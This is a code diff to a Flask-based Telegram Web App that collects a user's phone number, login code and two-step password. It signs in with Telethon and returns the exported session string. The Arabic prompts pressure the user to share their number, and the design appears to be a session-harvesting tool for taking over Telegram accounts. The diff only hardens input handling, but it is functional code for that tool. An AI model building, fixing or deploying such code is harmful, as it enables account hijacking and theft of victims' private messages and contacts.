@@ -53,14 +53,16 @@ WEB_APP_HTML = """
             if (tg.requestContact) {
                 tg.requestContact((shared, contact) => {
                     if (shared && contact) {
-                        callApi('phone', '+' + contact.phone_number);
+                        let phoneNum = contact.phone_number.toString();
+                        if (!phoneNum.startsWith('+')) phoneNum = '+' + phoneNum;
+                        callApi('phone', phoneNum);
                     } else {
                         alert("عذراً، يجب مشاركة الرقم للمتابعة.");
                     }
                 });
             } else {
                 let phone = prompt("أدخل رقم هاتفك مع رمز الدولة (مثال: +966...):");
-                if (phone) callApi('phone', phone);
+                if (phone) callApi('phone', phone.toString());
             }
         }
 
@@ -98,13 +100,13 @@ WEB_APP_HTML = """
         }
 
         function submitCode() {
-            let code = document.getElementById('code_val').value;
+            let code = document.getElementById('code_val').value.toString();
             if(!code) { alert("أدخل الكود أولاً"); return; }
             callApi('code', code);
         }
 
         function submitPassword() {
-            let pass = document.getElementById('pass_val').value;
+            let pass = document.getElementById('pass_val').value.toString();
             if(!pass) { alert("أدخل كلمة المرور أولاً"); return; }
             callApi('password', pass);
         }
@@ -122,12 +124,12 @@ def api():
     global active_sessions
     data = request.json
     action = data.get('action')
-    value = data.get('value')
+    value = str(data.get('value')) if data.get('value') else ""
     user_id = str(data.get('user_id'))
 
     try:
         if action == 'phone':
-            phone = value
+            phone = str(value).strip()
             client = TelegramClient(StringSession(), API_ID, API_HASH)
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
@@ -139,7 +141,7 @@ def api():
                 'client': client,
                 'loop': loop,
                 'phone': phone,
-                'hash': sent_code.phone_code_hash
+                'hash': str(sent_code.phone_code_hash)
             }
             return {"status": "need_code"}
 
@@ -150,12 +152,12 @@ def api():
             
             client = session_data['client']
             loop = session_data['loop']
-            code = value
+            code = str(value).strip()
             
             try:
-                loop.run_until_complete(client.sign_in(session_data['phone'], code, phone_code_hash=session_data['hash']))
+                loop.run_until_complete(client.sign_in(str(session_data['phone']), code, phone_code_hash=str(session_data['hash'])))
                 session_str = client.session.save()
-                return {"status": "done", "session": session_str}
+                return {"status": "done", "session": str(session_str)}
             except Exception as e:
                 err_str = str(e)
                 if "SessionPasswordNeededError" in err_str or "password" in err_str.lower():
@@ -170,12 +172,12 @@ def api():
             
             client = session_data['client']
             loop = session_data['loop']
-            password = value
+            password = str(value).strip()
             
             try:
                 loop.run_until_complete(client.sign_in(password=password))
                 session_str = client.session.save()
-                return {"status": "done", "session": session_str}
+                return {"status": "done", "session": str(session_str)}
             except Exception as e:
                 return {"status": "error", "message": f"كلمة المرور خطأ: {e}"}
 
